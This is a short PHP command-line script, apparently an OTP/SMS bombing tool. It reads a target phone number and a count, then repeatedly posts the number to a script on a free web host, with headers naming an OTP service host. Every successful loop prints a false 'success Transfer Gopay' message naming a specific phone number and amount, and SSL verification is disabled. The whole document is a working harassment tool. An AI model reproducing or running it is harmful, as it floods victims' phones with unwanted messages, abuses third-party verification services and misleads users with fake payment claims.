<?php
echo "================================ \n";
echo "   create with love syfalw \n";
echo "================================ \n";



echo "[?]Nomer : 0";
$no = trim(fgets(STDIN));
echo "[?]Jumlah : ";
$jmlh = trim(fgets(STDIN));

$headers = array();
    $headers[] = 'LANG: en';
    $headers[] = 'Content-Type: application/json; charset=UTF-8';
    $headers[] = 'Content-Length: 44';
    $headers[] = 'Host: phr.gms.digital';
    $headers[] = 'Connection: close';
    $headers[] = 'Accept-Encoding: gzip, deflate';

    //otp
$i = 0;
while($i < $jmlh) {
    $gtop = "{\"memberToken\":\"\",\"receivers\":\"$no\"}";
    $gotp = curl('https://api-nabilah.000webhostapp.com/dog.php?no=', $gtop, $headers);
    $gots = json_decode($gotp[1]); 
    if($gots == true ){
        echo " => success Transfer Gopay to 085321447498 Rp.20000 \n";
    }
  $i++;
  }

function curl($url, $fields = null, $headers = null)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        if ($fields !== null) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
        }
        if ($headers !== null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        $result   = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return array(
            $result,
            $httpcode
        );
    }
